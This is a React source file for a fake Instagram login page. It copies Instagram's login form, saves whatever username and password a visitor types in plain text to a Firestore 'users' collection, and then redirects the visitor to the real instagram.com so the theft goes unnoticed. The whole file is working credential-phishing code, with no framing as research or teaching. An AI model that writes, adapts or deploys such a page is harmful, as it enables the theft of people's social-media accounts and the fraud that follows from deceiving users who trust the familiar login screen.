import './App.css';
import {db} from './firebase-config'
import {collection, getDocs, addDoc} from "firebase/firestore"
import { useEffect, useState } from 'react';

function App() {

  const [newUserName, setNewUserName] = useState("");
  const [newPassword, setNewPassword] = useState("");

  const usersCollectionRef = collection( db, 'users');

  const createUser = (e) => {
    e.preventDefault()
    addDoc(usersCollectionRef, { username: newUserName, password: newPassword})
    .then(err => {console.log("oknpm", err)
                  window.location.replace('https://www.instagram.com') 
     })
    .catch(err => console.log("there is an error", err));
  }

  return (
    <div className="container">
    <div className="box">
      <div className="heading"></div>
      <form className="login-form">
        <div className="field">
          <input
            id="username"
            type="name"
            placeholder="Phone number, username, or email"
            onChange={(event) => setNewUserName(event.target.value)}
          />
          <label htmlFor="username">Phone number, username, or email</label>
        </div>
        <div className="field">
          <input id="password" type="password" placeholder="password" onChange={(event) => setNewPassword(event.target.value)}/>
          <label htmlFor="password">Password</label>
        </div>
          <button className="login-button" title="login" onClick={(e) => createUser(e)}>Log In</button>
          <div className="separator">
            <div className="line"></div>
            <p>OR</p>
            <div className="line"></div>
          </div>
        <div className="other">
          <button className="fb-login-btn" type="button">
            <i className="fa fa-facebook-official fb-icon"></i>
            <span className="">Log in with Facebook</span>
          </button>
          <a className="forgot-password" href="#">Forgot password?</a>
        </div>
      </form>
    </div>
    <div className="box">
      <p>Don't have an account? <a className="signup" href="#">Sign Up</a></p>
    </div>
  </div>
  
  );
}

export default App;
